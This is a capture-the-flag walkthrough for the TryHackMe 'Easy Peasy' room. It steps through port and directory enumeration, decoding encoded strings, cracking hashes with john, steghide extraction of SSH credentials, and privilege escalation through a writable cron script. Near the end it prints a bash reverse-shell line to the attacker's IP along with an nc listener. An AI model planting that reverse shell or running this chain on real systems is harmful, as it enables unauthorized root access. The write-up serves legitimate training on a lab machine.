# CTF-Write-up

## Try Hack Me: Easy Peasy

 URL: https://tryhackme.com/room/easypeasyctf

 Created by _https://tryhackme.com/p/kral4_

![logo](https://user-images.githubusercontent.com/20625004/114728013-61900780-9d47-11eb-8f19-a100e1fa566d.PNG)

 You should deploy the machine first.

 Add the CTF ip to your host file.

``` echo "CTF ip" >> /etc/hosts```

 Run nmap against the target machine, here we are going for all ports.

```nmap -sC -A -p- <target IP>```

 The output of the ``nmap`` should provide you with the three questions of task1.

 Now lets move on task2.

 From previous step we found some services.

![ngingx](https://user-images.githubusercontent.com/20625004/114729262-7b7e1a00-9d48-11eb-809e-f66518542c51.PNG)

 Fire ``gobuster``

 ``gobuster dir -u <target ip>:80 -w /path/to/wordlist``

 We found a path ``/h....``.

 There is a picture and the source code does not reveal anything.

 Lets use again ``gobuster`` 

``gobuster dir -u <target ip>/h...:80 -w /path/to/wordlist``

 OK we found another path.

![path](https://user-images.githubusercontent.com/20625004/114729794-fb0be900-9d48-11eb-8d3f-5ee65b5626f9.PNG)

 There is another picture, lets view the source code.

![flag1](https://user-images.githubusercontent.com/20625004/114730020-2b538780-9d49-11eb-829d-3a0b759357f2.PNG)

 This seems to be a base64 encoding. Lets decode it.

`` echo "base64" | base64 -d``

![flag1_1](https://user-images.githubusercontent.com/20625004/114730553-a4eb7580-9d49-11eb-9f92-bf204b1e7286.PNG)

 We found the first flag.

 Lets move on the second flag.

 From task 1 we found some services. Lets access the other web port.

![http](https://user-images.githubusercontent.com/20625004/114731182-32c76080-9d4a-11eb-9f5d-dda4a03bafb6.PNG)

 Again fire ``gobuster`` with the new higher http port. 

``gobuster dir -u <target ip>:Port -w /path/to/wordlist``

 Check robots.txt

![useragent](https://user-images.githubusercontent.com/20625004/114731499-79b55600-9d4a-11eb-98fa-9c180fa64163.PNG)

 It looks like a hash lets check it.

 To check for hashes types i am using the below tools.

 ``https://github.com/HashPals/Name-That-Hash``
 ``https://github.com/noraj/haiti/``

![second_flag](https://user-images.githubusercontent.com/20625004/114731871-c00ab500-9d4a-11eb-9136-660cc368d965.PNG)

 Lets decrypt it. 
 We may know it is a md5, but we cannot crack it. After searching around i found this website: ``https://md5hashing.net/``.

![second_flag_1](https://user-images.githubusercontent.com/20625004/114733229-d7966d80-9d4b-11eb-9d7d-62534d81a46c.PNG)

 And we have the second flag.

 Moving on the third flag.

 Searching around using ``gobuster`` to find new paths i was not able to find something helpful. 
 After a lot of trials and errors i looked the view source of the default apache page.
 In plaintext there is the third flag. 

![flag3](https://user-images.githubusercontent.com/20625004/114734963-65268d00-9d4d-11eb-9cb7-8393d5d13f54.PNG)

 Now for the hidden directory?

 Again after a lot of enumeration i was not able to find something. 
 I started and manually searched all web pages from both web ports.
 Finaly again on the default apache web page we found something useful.

![hidden](https://user-images.githubusercontent.com/20625004/114735620-0b729280-9d4e-11eb-9033-f1bc43da9c03.PNG)

 There is a hint of the encoding. Lets try base64, base62. 

 It is base62 i used this site ``https://www.better-converter.com/Encoders-Decoders/Base62-Decode``.

![base62](https://user-images.githubusercontent.com/20625004/114736195-8e93e880-9d4e-11eb-82f4-f3f07f3a366d.PNG)

 And we found the hidden directory.

 Lets access it.

![directory](https://user-images.githubusercontent.com/20625004/114736815-1aa61000-9d4f-11eb-8176-28e1b4b556e2.PNG)

 Move on to the next question ``Using the wordlist that provided to you in this task crack the hash. what is the password?``.

 There is another hash lets use it with the ``easypeasy.txt`` wordlist and with ``john``.
 The hint tell us that it is GOST hash.

``john --format=GOST hash.txt --wordlist=easypeasy.txt``

![cracked](https://user-images.githubusercontent.com/20625004/114737260-84261e80-9d4f-11eb-876d-8ed9e9827340.PNG)

 And we have the answer to the question.

 We move on to the SSH password. Remember from nmap on task 1, SSH is not running on port 22 but on another.

![directory](https://user-images.githubusercontent.com/20625004/114736445-c438d180-9d4e-11eb-8fe3-d05c3d154854.PNG)

 By viewing the source page of the previous page we found a picture, download it.

![picture](https://user-images.githubusercontent.com/20625004/114737967-31993200-9d50-11eb-8be1-dabef7ef5d7f.PNG)

![picture2](https://user-images.githubusercontent.com/20625004/114737985-365de600-9d50-11eb-9843-86ab6300addc.PNG)

``wget http://<Target IP>:port/path/binarycodepixabay.jpg``

 We are using ``steghide``.

``steghide extract -sf binarycodepixabay.jpg``

 After some trials and errors i used the password we found on the previous step and we got access to a txt file.

![pass](https://user-images.githubusercontent.com/20625004/114738823-ffd49b00-9d50-11eb-91e0-917c3b1606c5.PNG)

 We found a username and a password. There were a lot of binary numbers, and i converted the binary content with the below web site.

``https://cryptii.com/pipes/binary-decoder``.

![ssh](https://user-images.githubusercontent.com/20625004/114739142-4a561780-9d51-11eb-9fc2-4c3067dc7d18.PNG)

 Now we have retrieved the username and the password of the SSH user.

 Access SSH with the new information.

``ssh XXX@targetIP -p port``

![ssh_access](https://user-images.githubusercontent.com/20625004/114739636-bafd3400-9d51-11eb-9d6d-921ece3a4ac3.PNG)

 Lets find the user flag.

 In home directory there is ``user.txt``.

![rot](https://user-images.githubusercontent.com/20625004/114739877-f697fe00-9d51-11eb-8f1c-46f8ce638d62.PNG)

 Another hash, but there is a hint ``Rotated`` seems it is ROT13.

 Use ``https://rot13.com/``

![rot13](https://user-images.githubusercontent.com/20625004/114740189-4b3b7900-9d52-11eb-9991-daf7bca2ba55.PNG)

 And we have found the user flag.

 Move on the privilege escalation in order to found the last flag.

 CTF informed us about a vulnerable crontab. Lets search.

![crontab](https://user-images.githubusercontent.com/20625004/114740592-aa998900-9d52-11eb-8c43-d9a424e359a0.PNG)

 Ok we found a bash script called, ``.mysecretcronjob.sh``.

 Move on the destination path to see what is going on.

![script](https://user-images.githubusercontent.com/20625004/114740914-f64c3280-9d52-11eb-9bb9-74d1a3d6ba87.PNG)

 It seems that we have read write and execute permissions, simply open the file with ``nano`` and add a reverse shell.

``bash -i >& /dev/tcp/'Your IP'/4444 0>&1``

 On your machine set up a netcat listener:

``nc -lnvp 4444``

 Then execute the script.

 Notice  on your machine that we have access on the system as root.

![root](https://user-images.githubusercontent.com/20625004/114741754-c2bdd800-9d53-11eb-85f0-002f91e5def4.PNG)

 On ``/root`` directory there is the ``.root.txt``, use ``ls -la`` command as the file is hidden.

 And we have found the last flag.

